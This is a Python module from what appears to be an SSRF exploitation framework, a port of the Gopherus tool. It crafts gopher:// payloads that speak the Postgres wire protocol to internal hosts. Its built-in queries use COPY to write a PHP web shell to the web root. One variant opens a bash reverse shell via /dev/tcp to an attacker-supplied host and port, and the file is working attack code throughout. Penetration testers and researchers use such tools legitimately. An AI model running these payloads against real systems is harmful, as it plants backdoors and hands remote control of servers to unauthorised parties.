from core.utils import *
import logging
import binascii

# NOTE
# This exploit is a Python 3 version of the Gopherus tool

name        = "postgres"
description = "Execute Postgres command"
author      = "sengkyaut"
documentation = [
    "https://github.com/tarunkant/Gopherus"
]

class exploit():
    user    = "postgres"
    database = "postgres"
    reverse = "COPY (SELECT '<?php system(\"bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1\");?>') TO '/var/www/html/shell.php';"
    php_cmd_shell = "COPY (SELECT '<?php system($_GET[\"cmd\"]);?>') TO '/var/www/html/shell.php';"

    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched !")

        # Get the username, database, query
        self.user = input("Give Postgres username (Default postgres): ") or self.user
        self.database = input("Give Postgres Database name (Default postgres): ") or self.database
        query = input("Give Postgres query to execute (reverse or phpshell or any Postgres statement): ")

        # Reverse shell - writing system() in /var/www/html/shell.php
        if query == "reverse":
            self.query = self.reverse
            if args.lhost == None: 
                self.query = self.query.replace("SERVER_HOST", input("Server Host:"))
            else:
                self.query = self.query.replace("SERVER_HOST", args.lhost)

            if args.lport == None: 
                self.query = self.query.replace("SERVER_PORT", input("Server Port:"))
            else:
                self.query = self.query.replace("SERVER_PORT", args.lport)

        elif query == "phpshell":
            self.query = self.php_cmd_shell

        else:
            self.query  = query

        # For every IP generated, send the payload
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            payload = self.get_payload(self.query, ip)
            logging.info(f"Generated payload : {payload}")

            r = requester.do_request(args.param, payload)

            if query == "reverse" or query == "phpshell":
                logging.info(f"Please check the shell.php on the web root for confirmation.")

            logging.info(f"Module '{name}' ended !")

    def encode(self, s, ip):
        a = [s[i:i + 2] for i in range(0, len(s), 2)]
        return wrapper_gopher("%"+"%".join(a), ip, "5432")

    def encode_to_hex_str(self, data):
        return binascii.hexlify(data.encode()).decode()

    def get_payload(self, query, ip):
        if(query.strip()!=''):
            # Encode username, db and query
            encode_user = self.encode_to_hex_str(self.user)
            encode_db =  self.encode_to_hex_str(self.database)
            encode_query = self.encode_to_hex_str(self.query)
            len_query = len(query) + 5

            # Construct the payload
            start = "000000" + self.encode_to_hex_str(chr(4+len(self.user)+8+len(self.database)+13)) + "000300"
            data = "00" + self.encode_to_hex_str("user") + "00" + encode_user + "00" + self.encode_to_hex_str("database") + "00" + encode_db
            data += "0000510000" + str(hex(len_query)[2:]).zfill(4)
            data += encode_query
            end = "005800000004"

            packet = start + data + end
            final = self.encode(packet, ip)
            return final
        else:
            logging.error(f"Query can't be empty")
            raise Exception('Postgres query empty!')
